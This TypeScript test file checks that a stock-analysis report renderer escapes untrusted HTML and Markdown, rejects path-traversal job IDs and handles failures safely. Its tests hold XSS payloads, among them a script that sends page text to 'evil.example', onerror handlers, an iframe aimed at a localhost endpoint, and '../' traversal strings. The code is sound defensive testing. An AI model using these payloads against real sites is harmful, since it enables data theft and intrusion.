import assert from "node:assert/strict";
import {
  existsSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { performance } from "node:perf_hooks";
import test from "node:test";
import { renderReportHtml, saveReportWithRenderer } from "./pdf-report.js";

async function inTemporaryWorkingDirectory(
  run: (directory: string) => Promise<void>,
): Promise<void> {
  const directory = mkdtempSync(join(tmpdir(), "stockanalyst-pdf-report-"));
  const previousDirectory = process.cwd();
  process.chdir(directory);
  try {
    await run(process.cwd());
  } finally {
    process.chdir(previousDirectory);
    rmSync(directory, { recursive: true, force: true });
  }
}

function reportBody(html: string): string {
  const match = html.match(/<div class="body" id="report-body">\n([\s\S]*?)\n<\/div>/);
  assert.ok(match, "the report body must be present in the rendered document");
  return match[1];
}

function assertTrustedReportBodyMarkup(body: string): void {
  const trustedTags = new Set([
    "h1", "h2", "h3", "h4", "blockquote", "p", "ul", "ol", "li",
    "table", "thead", "tbody", "tr", "th", "td", "strong", "em", "code", "span", "hr",
  ]);
  const trustedSpanClasses = new Set(["badge badge-buy", "badge badge-hold", "badge badge-sell", "pos", "neg"]);

  for (const [, tag] of body.matchAll(/<\/?([a-z][a-z0-9-]*)(?:\s[^<>]*)?>/gi)) {
    assert.ok(trustedTags.has(tag.toLowerCase()), `unexpected report-body tag: ${tag}`);
  }

  for (const [, tag, attributes] of body.matchAll(/<([a-z][a-z0-9-]*)([^<>]*)>/gi)) {
    const normalizedTag = tag.toLowerCase();
    if (normalizedTag === "span") {
      const classMatch = attributes.match(/^ class="([^"]+)"$/);
      assert.ok(classMatch, `unexpected span attributes: ${attributes}`);
      assert.ok(trustedSpanClasses.has(classMatch[1]), `unexpected span class: ${classMatch[1]}`);
    } else {
      assert.equal(attributes, "", `unexpected ${normalizedTag} attributes: ${attributes}`);
    }
  }
}

test("renders seller HTML payloads as inert text", () => {
  const payloads = [
    "<script>fetch('https://evil.example/' + document.body.innerText)</script>",
    '<img src="https://evil.example/pixel" onerror="alert(1)">',
    '<iframe src="http://127.0.0.1:9374/v1/memory"></iframe>',
    '</div><style>body{display:none}</style><div>',
    '<a href="https://evil.example">click</a>',
  ];

  for (const payload of payloads) {
    const html = renderReportHtml(payload, {
      jobId: "7",
      date: "23 July 2026",
      symbols: "AAPL",
    });
    assert.ok(html.includes("&lt;"));
    assert.doesNotMatch(html, /<(script|img|iframe|a)\b/i);
    assert.doesNotMatch(html, /\bon(?:error|load)\s*=\s*["']/i);
    assert.doesNotMatch(html, /<\/div><style>body\{display:none\}/i);
  }
});

test("keeps hostile Markdown inert across every supported report element", () => {
  const rawAttackerMarkup = '<img src="https://evil.example/pixel" onerror="alert(1)"><script>globalThis.pwned=1</script>';
  const preEncodedEntities = "&lt;already-encoded&gt; &amp;";
  const report = [
    `# Heading ${rawAttackerMarkup} ${preEncodedEntities}`,
    `> Quote ${rawAttackerMarkup} ${preEncodedEntities}`,
    `- Unordered ${rawAttackerMarkup} ${preEncodedEntities}`,
    `1. Ordered ${rawAttackerMarkup} ${preEncodedEntities}`,
    [
      "| Column |",
      "| --- |",
      `| Table ${rawAttackerMarkup} ${preEncodedEntities} |`,
    ].join("\n"),
    `*Emphasis ${rawAttackerMarkup} ${preEncodedEntities}*`,
    `\`Code ${rawAttackerMarkup} ${preEncodedEntities}\``,
  ].join("\n\n");
  const body = reportBody(renderReportHtml(report, {
    jobId: "7",
    date: "23 July 2026",
    symbols: "AAPL",
  }));

  assertTrustedReportBodyMarkup(body);
  assert.match(body, /<blockquote><p>Quote /);
  assert.match(body, /<ul><li>Unordered /);
  assert.match(body, /<ol><li>Ordered /);
  assert.match(body, /<table><thead><tr><th>Column<\/th><\/tr><\/thead><tbody><tr><td>Table /);
  assert.match(body, /<em>Emphasis /);
  assert.match(body, /<code>Code /);
  const escapedAttackerMarkup = "&lt;img src=&quot;https://evil.example/pixel&quot; onerror=&quot;alert(1)&quot;&gt;&lt;script&gt;globalThis.pwned=1&lt;/script&gt;";
  assert.equal(body.split(escapedAttackerMarkup).length - 1, 7);
  assert.equal(body.split("&amp;lt;already-encoded&amp;gt; &amp;amp;").length - 1, 7);
  assert.doesNotMatch(body, /<(?:img|script)\b/i);
});

test("escapes every metadata field", () => {
  const html = renderReportHtml("safe", {
    jobId: '7</div><script>alert(1)</script>',
    date: '<img src=x onerror="alert(1)">',
    symbols: 'AAPL</div><iframe src="https://evil.example">',
  });
  assert.doesNotMatch(html, /<(script|img|iframe)\b/i);
  assert.match(html, /&lt;script&gt;/);
  assert.match(html, /&lt;img/);
  assert.match(html, /&lt;iframe/);
});

test("contains no browser-side script while preserving report styling", () => {
  const html = renderReportHtml(
    "# Verdict\n\n> **BUY**\n\nReturn: +12.5% and drawdown: -3.2%\n\n| Symbol | View |\n| --- | --- |\n| AAPL | HOLD |",
    { jobId: "7", date: "23 July 2026", symbols: "AAPL" },
  );
  assert.doesNotMatch(html, /<script\b/i);
  assert.doesNotMatch(html, /\.innerHTML\s*=/);
  assert.match(html, /<h1>Verdict<\/h1>/);
  assert.match(html, /badge-buy/);
  assert.match(html, /badge-hold/);
  assert.match(html, /class="pos"/);
  assert.match(html, /class="neg"/);
  assert.match(html, /<table>/);
});

test("renders newline-heavy untrusted reports in linear time", () => {
  const report = `${"\n".repeat(40_000)}end`;
  const startedAt = performance.now();

  const html = renderReportHtml(report, {
    jobId: "7",
    date: "23 July 2026",
    symbols: "AAPL",
  });

  const elapsedMs = performance.now() - startedAt;
  assert.match(html, /<p>end<\/p>/);
  assert.ok(
    elapsedMs < 1_000,
    `newline-heavy report took ${elapsedMs.toFixed(1)}ms`,
  );
});

test("removes a partial PDF while keeping an inert HTML fallback when rendering fails", async () => {
  await inTemporaryWorkingDirectory(async (directory) => {
    const result = await saveReportWithRenderer(
      "<script>alert('unsafe')</script>",
      "42",
      ["AAPL"],
      async (_html, pdfPath) => {
        writeFileSync(pdfPath, "partial pdf", "utf8");
        throw new Error("sandbox unavailable");
      },
    );

    assert.equal(result.pdfPath, null);
    assert.equal(result.htmlPath, resolve(directory, "stock-analysis-42.html"));
    assert.equal(existsSync(resolve(directory, "stock-analysis-42.pdf")), false);
    const html = readFileSync(result.htmlPath, "utf8");
    assert.match(html, /&lt;script&gt;/);
    assert.doesNotMatch(html, /<script\b/i);
  });
});

test("rejects noncanonical job IDs before writing files or calling the renderer", async () => {
  await inTemporaryWorkingDirectory(async (directory) => {
    const outsidePath = resolve(directory, "..", "pdf-report-escape.html");
    const invalidJobIds = [
      "01",
      "",
      "+1",
      "-1",
      " 1",
      "1 ",
      "1.0",
      "1_000",
      "0x1",
      "..//..//../pdf-report-escape",
      "115792089237316195423570985008687907853269984665640564039457584007913129639936",
    ];
    let rendererCalls = 0;

    for (const jobId of invalidJobIds) {
      await assert.rejects(
        saveReportWithRenderer("safe", jobId, ["AAPL"], async () => { rendererCalls += 1; }),
        /canonical decimal uint256/,
      );
    }

    assert.equal(rendererCalls, 0);
    assert.equal(existsSync(outsidePath), false);
    assert.deepEqual(readdirSync(directory), []);
  });
});

test("passes the saved inert HTML to a successful PDF renderer", async () => {
  await inTemporaryWorkingDirectory(async (directory) => {
    let renderedHtml: string | undefined;
    const expectedPdfPath = resolve(directory, "stock-analysis-43.pdf");

    const result = await saveReportWithRenderer(
      "# **BUY** AAPL",
      "43",
      ["AAPL"],
      async (html, pdfPath) => {
        renderedHtml = html;
        assert.equal(pdfPath, expectedPdfPath);
        writeFileSync(pdfPath, "pdf", "utf8");
      },
    );

    assert.equal(result.pdfPath, expectedPdfPath);
    assert.equal(result.htmlPath, resolve(directory, "stock-analysis-43.html"));
    assert.equal(renderedHtml, readFileSync(result.htmlPath, "utf8"));
    assert.match(renderedHtml ?? "", /badge-buy/);
  });
});
